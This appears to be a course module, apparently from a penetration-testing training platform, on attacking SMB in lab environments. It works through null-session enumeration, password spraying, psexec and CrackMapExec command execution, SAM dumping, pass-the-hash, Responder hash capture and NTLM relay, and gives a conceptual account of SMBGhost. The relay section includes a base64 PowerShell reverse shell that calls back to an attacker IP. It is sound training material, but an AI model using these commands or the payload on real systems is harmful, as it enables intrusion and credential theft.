## Enumeration

Depending on the SMB implementation and the operating system, we will get different information using `Nmap`. Keep in mind that when targetting Windows OS, version information is usually not included as part of the Nmap scan results. Instead, Nmap will try to guess the OS version. However, we will often need other scans to identify if the target is vulnerable to a particular exploit. We will cover searching for known vulnerabilities later in this section. For now, let's scan ports 139 and 445 TCP.
```shell-session
alakin2504@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
```

## Misconfigurations

SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.

#### Anonymous Authentication

If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including  `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`. Let's explore how we can interact with file shares and RPC using null authentication.

#### File Share

Using `smbclient`, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session.

```shell-session
alakin2504@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

`Smbmap` is another tool that helps us enumerate network shares and access associated permissions. An advantage of `smbmap` is that it provides a list of permissions for each shared folder.

```shell-session
alakin2504@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:

```shell-session
alakin2504@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```


From the above example, the permissions are set to `READ` and `WRITE`, which one can use to upload and download the files.

```shell-session
alakin2504@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

```shell-session
alakin2504@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

#### Remote Procedure Call (RPC)

We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller.

The `rpcclient` tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. We can use this [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or review the complete list of all these functions found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.

```shell-session
alakin2504@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:

- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

```shell-session
alakin2504@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C

ENUM4LINUX - next generation
```

## Protocol Specifics Attacks

If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).

#### Brute Forcing and Password Spray
```shell-session
alakin2504@htb[/htb]$ cat /tmp/userlist.txt

Administrator
jrodriguez 
admin
<SNIP>
jurena
```

```shell-session
alakin2504@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

**Note:** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`. For a more detailed study Password Spraying see the Active Directory Enumeration & Attacks module.

#### SMB

Linux and Windows SMB servers provide different attack paths. Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment, as we will discuss later in this section. However, in Windows, the attack surface is more significant.

When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:

- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)

#### Remote Code Execution (RCE)

To connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command:
```shell-session
alakin2504@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.110.17.....
[*] Found writable share ADMIN$
[*] Uploading file EHtJXgng.exe
```

#### CrackMapExec

Another tool we can use to run CMD or PowerShell is `CrackMapExec`. One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the IP address or IP address range, the option `-u` for username, and `-p` for the password, and the option `-x` to run cmd commands or uppercase `-X` to run PowerShell commands.

```shell-session
alakin2504@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

**Note:** If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

#### Enumerating Logged-on Users

Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.

```shell-session
alakin2504@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Enumerated loggedon users
```

#### Extract Hashes from SAM Database

The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:

- Authenticate as another user.
- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
- Pass The Hash. We will discuss it later in this section.


```shell-session
alakin2504@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
```
#### Pass-the-Hash (PtH)

If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user's password instead of the plaintext password. We can use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`, among other tools. Here is an example of how this would work with `CrackMapExec`:


```shell-session
alakin2504@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD
```

#### Forced Authentication Attacks

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

The most common tool to perform such operations is the `Responder`. [Responder](https://github.com/lgandx/Responder) is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

Let's illustrate an example to understand better how `Responder` works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:


```shell-session
alakin2504@htb[/htb]$ responder -I <interface name>
```
When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:

- The hostname file share's IP address is required.
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.


```shell-session
alakin2504@htb[/htb]$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
```

These captured credentials can be cracked using [hashcat](https://hashcat.net/hashcat/) or relayed to a remote host to complete the authentication and impersonate the user.

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.

**Note:** If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.

```shell-session
alakin2504@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
```
The NTLMv2 hash was cracked. The password is `P@ssword`. If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```shell-session
alakin2504@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.


```shell-session
alakin2504@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>

[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
```


We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

```shell-session
alakin2504@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.

```shell-session
alakin2504@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

#### RPC

In the [Footprinting module](https://academy.hackthebox.com/course/preview/footprinting), we discuss how to enumerate a machine using RPC. Apart from enumeration, we can use RPC to make changes to the system, such as:

- Change a user's password.
- Create a new domain user.
- Create a new shared folder.

We also cover enumeration using RPC in the [Active Directory Enumeration & Attacks module](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).

Keep in mind that some specific configurations are required to allow these types of changes through RPC. We can use the [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) or [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) from the SANS Institute to explore this further.

# Latest SMB Vulnerabilities

One recent significant vulnerability that affected the SMB protocol was called [SMBGhost](https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796) with the [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796). The vulnerability consisted of a compression mechanism of the version SMB v3.1.1 which made Windows 10 versions 1903 and 1909 vulnerable to attack by an unauthenticated attacker. The vulnerability allowed the attacker to gain remote code execution (`RCE`) and full access to the remote target system.

## The Concept of the Attack

In simple terms, this is an [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) vulnerability in a function of an SMB driver that allows system commands to be overwritten while accessing memory. An integer overflow results from a CPU attempting to generate a number that is greater than the value required for the allocated memory space. Arithmetic operations can always return unexpected values, resulting in an error. An example of an integer overflow can occur when a programmer does not allow a negative number to occur. In this case, an integer overflow occurs when a variable performs an operation that results in a negative number, and the variable is returned as a positive integer. This vulnerability occurred because, at the time, the function lacked bounds checks to handle the size of the data sent in the process of SMB session negotiation.

To learn more about buffer overflow techniques and vulnerabilities, check out the [Stack-Based Buffer Overflows on Linux x86](https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-linux-x86), and [Stack-Based Buffer Overflows on Windows x86](https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-windows-x86) module. These go into detail on the basics of how the buffer can be overwritten and handled by the attacker.

#### The Concept of Attacks

The vulnerability occurs while processing a malformed compressed message after the `Negotiate Protocol Responses`. If the SMB server allows requests (over TCP/445), compression is generally supported, where the server and client set the terms of communication before the client sends any more data. Suppose the data transmitted exceeds the integer variable limits due to the excessive amount of data. In that case, these parts are written into the buffer, which leads to the overwriting of the subsequent CPU instructions and interrupts the process's normal or planned execution. These data sets can be structured so that the overwritten instructions are replaced with our own ones, and thus we force the CPU (and hence also the process) to perform other tasks and instructions.

#### Initiation of the Attack

|**Step**|**SMBGhost**|**Concept of Attacks - Category**|
|---|---|---|
|`1.`|The client sends a request manipulated by the attacker to the SMB server.|`Source`|
|`2.`|The sent compressed packets are processed according to the negotiated protocol responses.|`Process`|
|`3.`|This process is performed with the system's privileges or at least with the privileges of an administrator.|`Privileges`|
|`4.`|The local process is used as the destination, which should process these compressed packets.|`Destination`|

This is when the cycle starts all over again, but this time to gain remote access to the target system.

#### Trigger Remote Code Execution

|**Step**|**SMBGhost**|**Concept of Attacks - Category**|
|---|---|---|
|`5.`|The sources used in the second cycle are from the previous process.|`Source`|
|`6.`|In this process, the integer overflow occurs by replacing the overwritten buffer with the attacker's instructions and forcing the CPU to execute those instructions.|`Process`|
|`7.`|The same privileges of the SMB server are used.|`Privileges`|
|`8.`|The remote attacker system is used as the destination, in this case, granting access to the local system.|`Destination`|

However, despite the vulnerability's complexity due to the buffer's manipulation, which we can see in the [PoC](https://www.exploit-db.com/exploits/48537), the concept of the attack nevertheless applies here.
